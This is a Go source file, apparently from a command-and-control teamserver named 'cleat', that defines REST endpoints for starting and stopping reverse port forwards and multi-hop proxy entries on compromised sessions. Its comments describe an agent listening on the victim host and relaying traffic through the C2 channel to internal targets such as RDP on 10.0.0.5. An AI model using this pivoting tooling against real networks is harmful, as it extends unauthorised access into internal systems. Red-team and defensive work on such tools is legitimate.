package api

// 反向端口转发(rportfwd)与多跳入口(entry)的 REST 接口。

import (
	"encoding/json"
	"net/http"
	"strconv"

	"cleat/teamserver/internal/apierr"
	"cleat/teamserver/internal/auth"
)

// POST /api/pivots/entry 为指定会话启动多跳入口。
// 凭据由 TS 生成并下发, 响应返回凭据供操作员手动连入(如 curl --proxy)。
// body: {"session_id":154,"port":7788}
func (s *Server) addEntry(w http.ResponseWriter, r *http.Request) {
	identity, _ := auth.FromContext(r.Context())
	if !identity.CanWrite() {
		writeErr(w, http.StatusForbidden, apierr.CodeDenied, "viewer 无权限管理隧道")
		return
	}
	var req struct {
		SessionID int `json:"session_id"`
		Port      int `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeErr(w, http.StatusBadRequest, apierr.CodeInvalidParam, "无效 JSON")
		return
	}
	if req.SessionID <= 0 || req.Port <= 0 || req.Port > 65535 {
		writeErr(w, http.StatusBadRequest, apierr.CodeInvalidParam, "session_id/port 无效")
		return
	}
	user, pass, err := s.svc.EntryAdd(identity.Username, req.SessionID, req.Port)
	if err != nil {
		serviceErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"port": req.Port,
		"user": user,
		"pass": pass,
	})
}

// GET /api/rportfwds 反向端口转发列表。
func (s *Server) listRportfwds(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{"rportfwds": s.svc.Rportfwds()})
}

// POST /api/rportfwds 为指定会话启动反向端口转发。
// body: {"session_id":154,"listen_port":3389,"target_host":"10.0.0.5","target_port":3389}
// Agent 在受害主机上监听 listen_port, 入站流量经 C2 通道由 Server 转发到目标。
func (s *Server) addRportfwd(w http.ResponseWriter, r *http.Request) {
	identity, _ := auth.FromContext(r.Context())
	if !identity.CanWrite() {
		writeErr(w, http.StatusForbidden, apierr.CodeDenied, "viewer 无权限管理隧道")
		return
	}
	var req struct {
		SessionID  int    `json:"session_id"`
		ListenPort int    `json:"listen_port"`
		TargetHost string `json:"target_host"`
		TargetPort int    `json:"target_port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeErr(w, http.StatusBadRequest, apierr.CodeInvalidParam, "无效 JSON")
		return
	}
	if req.SessionID <= 0 || req.ListenPort <= 0 || req.ListenPort > 65535 {
		writeErr(w, http.StatusBadRequest, apierr.CodeInvalidParam, "session_id/listen_port 无效")
		return
	}
	if err := s.svc.RportfwdAdd(identity.Username, req.SessionID, req.ListenPort, req.TargetHost, req.TargetPort); err != nil {
		serviceErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"agent_addr": ":" + strconv.Itoa(req.ListenPort),
		"target":     req.TargetHost + ":" + strconv.Itoa(req.TargetPort),
		"status":     "running",
	})
}

// DELETE /api/rportfwds?session_id=154&listen_port=3389 停止反向端口转发。
func (s *Server) deleteRportfwd(w http.ResponseWriter, r *http.Request) {
	identity, _ := auth.FromContext(r.Context())
	if !identity.CanWrite() {
		writeErr(w, http.StatusForbidden, apierr.CodeDenied, "viewer 无权限管理隧道")
		return
	}
	sid, _ := strconv.Atoi(r.URL.Query().Get("session_id"))
	lport, _ := strconv.Atoi(r.URL.Query().Get("listen_port"))
	if sid <= 0 || lport <= 0 {
		writeErr(w, http.StatusBadRequest, apierr.CodeInvalidParam, "session_id/listen_port 无效")
		return
	}
	if err := s.svc.RportfwdRemove(identity.Username, sid, lport); err != nil {
		writeErr(w, http.StatusNotFound, apierr.CodeNotFound, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{"ok": true})
}
